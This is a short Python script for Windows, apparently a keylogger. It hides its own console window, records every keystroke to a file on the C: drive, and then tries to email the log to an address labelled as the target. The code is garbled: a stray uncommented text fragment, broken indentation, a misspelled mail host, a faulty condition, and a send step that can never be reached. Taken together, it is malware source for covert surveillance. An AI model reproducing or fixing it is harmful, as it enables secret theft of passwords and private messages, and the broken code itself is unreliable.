import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook 
import smtplib

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 

def OnKeyboardEvent(event): 
	if event.Ascii==5: 
		_exit(1) 
	if event.Ascii !=0 or 8: 
	
		f = open('c:\zm.txt', 'r+') 
		buffer = f.read() 
		f.close() 
	 pen output.txt to write current + new keystrokes o
		f = open('c:\zm.txt', 'w') 
		keylogs = chr(event.Ascii) 
		if event.Ascii == 13: 
		keylogs = '/n'
		buffer += keylogs 
		f.write(buffer) 
		f.close() 

hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 

hm.HookKeyboard() 

pythoncom.PumpMessages() 

server=smtplib.SMTP('smpt.gmail', 587)

msg="zm.txt"

server.sendmail("you@gmail.com","target@example.com",msg)
